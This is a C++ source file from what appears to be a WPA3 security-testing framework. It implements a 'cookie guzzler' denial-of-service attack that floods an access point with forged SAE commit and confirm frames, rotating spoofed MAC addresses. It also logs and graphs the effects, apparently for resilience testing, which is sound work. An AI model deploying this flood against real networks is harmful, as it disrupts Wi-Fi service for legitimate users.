#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"

#include <string>
#include <tins/tins.h>
#include <unistd.h>

#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "attacks/DoS_hard/dos_helpers.h"
#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "config/RunStatus.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "observer/tshark_wrapper.h"
#include "system/firmware/ath9k_htc.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::cookie_guzzler {

void run_attack(RunStatus &rs) {
	const ActorPtr ap = rs.get_actor("ap");
	const ActorPtr attacker = rs.get_actor("attacker");
	const auto &att_cfg = rs.config().at("attack_config");

	const string variant = att_cfg.at("variant").get<string>();
	const bool hasty = variant == "hasty_peer";

	const optional<sae_helper::SAEPair> sae_params =
		get_commit_values(rs, attacker.get(SK::iface), attacker.get_mon_iface(), ap.get(SK::ssid), ap.get(SK::mac), 30);
	if(!sae_params.has_value()) throw run_err("SAE Commit capture failed");

	const HWAddress<6> ap_mac = ap.get(SK::mac);
	const string att_mac = attacker.get(SK::mac);
	const size_t burst_size = att_cfg.at("burst_size").get<size_t>();

	auto [fd, sock_addr] = bl0ck_attack::get_unblocking_socket(attacker.get_mon_iface());
	log(LogLevel::INFO, "SAE Commit captured, variant={}", variant);

	rs.start_observers();
	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
	rs.process_manager.write_log_all(ATTACK_START_tag);

	// MAC rotates every burst - new unique source MAC per burst of burst_size frames
	dos_helpers::timed_burst(fd, sock_addr, att_cfg.at("attack_time_sec").get<int>(),
		burst_size, att_cfg.at("frames_per_second_limit").get<size_t>(),
		[&]() -> optional<RadioTap> {
			const HWAddress<6> current_mac(firmware::get_rotating_ath_masker_mac(att_mac));

			if(hasty) {
				// hasty peer - commit/confirm frames - 50%/50%
				auto confirm = sae_helper::make_sae_confirm(ap_mac, current_mac);
				const auto bytes = confirm.serialize();
				sendto(fd, bytes.data(), bytes.size(), MSG_DONTWAIT,
					reinterpret_cast<const sockaddr *>(&sock_addr), sizeof(sock_addr));
			}
			return sae_helper::make_sae_commit(ap_mac, current_mac, sae_params.value());
		});

	rs.process_manager.write_log_all(ATTACK_STOP_tag);
	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
	close(fd);
	ap->disconnect();
}

void stats_attack(const RunStatus &rs) {
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
	observer::tshark::tshark_graph(rs, "client", elements, "", "udp.srcport == 1234 && udp.dstport == 5201  ");
	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source), elements);
}
}
